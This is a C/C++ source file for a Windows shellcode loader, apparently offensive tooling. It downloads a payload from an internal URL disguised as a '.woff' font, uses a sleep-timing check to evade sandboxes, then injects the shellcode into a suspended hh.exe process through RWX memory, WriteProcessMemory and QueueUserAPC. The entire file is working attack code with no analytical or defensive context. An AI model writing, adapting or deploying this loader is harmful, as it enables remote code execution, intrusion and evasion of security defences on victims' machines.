#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <wininet.h>
#include <string.h>
#include <wincrypt.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <bcrypt.h>
#include <iostream>
#include <map>
#include <string>
#include <fstream>
#pragma comment (lib, "Wininet.lib")

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE            = TRUE;

	HINTERNET	hInternet         = NULL,
			    hInternetFile     = NULL;

	DWORD		dwBytesRead       = NULL;
	
	SIZE_T		sSize             = NULL;
	PBYTE		pBytes            = NULL,
			    pTmpBytes          = NULL;



	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL){
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL){
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL){
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE){

		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		sSize += dwBytesRead;

		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}
		
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
		memset(pTmpBytes, '\0', dwBytesRead);

		if (dwBytesRead < 1024){
			break;
		}
	}
	
    *pPayloadBytes = pBytes;
	*sPayloadSize  = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	if (pTmpBytes)
		LocalFree(pTmpBytes);
	return bSTATE;
}

BOOL CheckVirtualAllocExNuma(){
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32 == NULL) {
        return FALSE;
    }

    FARPROC pVirtualAllocExNuma = GetProcAddress(hKernel32, "VirtualAllocExNuma");
    if (pVirtualAllocExNuma == NULL) {
        return FALSE;
    }

    return TRUE;
}

void evade() {
    FILETIME startTime;
    GetSystemTimeAsFileTime(&startTime);
    Sleep(2000);
    FILETIME endTime;
    GetSystemTimeAsFileTime(&endTime);
    ULARGE_INTEGER start, end;
    start.LowPart = startTime.dwLowDateTime;
    start.HighPart = startTime.dwHighDateTime;
    end.LowPart = endTime.dwLowDateTime;
    end.HighPart = endTime.dwHighDateTime;
    ULONGLONG elapsedTime = end.QuadPart - start.QuadPart;
    elapsedTime /= 10000000;

    if (elapsedTime < 1.5) {
        exit(0);
    }

    CheckVirtualAllocExNuma();

};

int main() {
    evade();
    LPCWSTR url = L"http://10.0.0.47/shellcode.woff";
    PBYTE pPayloadBytes = NULL;
    SIZE_T sPayloadSize = NULL;

    GetPayloadFromUrl(url, &pPayloadBytes, &sPayloadSize);

	
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    CreateProcessA("C:\\Windows\\hh.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    HANDLE victimProcess = pi.hProcess;
    HANDLE threadHandle = pi.hThread;

    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, sPayloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;

    WriteProcessMemory(victimProcess, shellAddress, pPayloadBytes, sPayloadSize, NULL);

    QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);

    ResumeThread(threadHandle);
}